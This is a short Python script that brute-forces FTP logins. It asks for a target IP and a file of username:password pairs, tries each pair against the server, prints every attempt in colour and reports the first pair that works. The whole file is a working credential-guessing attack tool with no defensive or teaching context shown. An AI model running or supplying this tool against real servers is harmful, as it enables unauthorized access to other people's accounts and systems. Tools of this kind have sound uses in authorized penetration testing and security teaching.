#!/usr/bin/python3

import ftplib
from termcolor import colored, cprint

def brutelogin(hostname, passwdfile):
	try:
		passF = open(passwdfile, 'r')
	except:
		print("[!] File Doesn't Exist!")
	for line in passF.readlines():
		Username= line.split(':')[0]
		Password= line.split(':')[1].strip('\n')
		cprint("[-] Trying: Username={}  Password={}".format(Username,Password), 'red', attrs=['bold'])
		#print(colored("[-] Trying: Username={}  Password={}".format(Username,Password),'red'))
		try:
			ftp = ftplib.FTP(hostname)
			login= ftp.login(Username, Password)
			cprint("\n[+] Login Succeeded With: Username={} | Password={}\n".format(Username,Password), 'green', attrs=['bold','underline'])
			#print(colored("\n[+] Login Succeeded With: Username={}  Password={}\n".format(Username,Password),'green'))
			ftp.quit()
			return(Username,Password)
		except:
			pass
	print("[-] Password Not In List")

host = input("[*] Enter Targets IP Address: ")
passwdfile = input('[*] Enter User/Password File Path: ')
print(colored("\n# Bruteforcing In Progress . . .\n", 'green', attrs=['bold', 'blink']))
brutelogin(host, passwdfile)

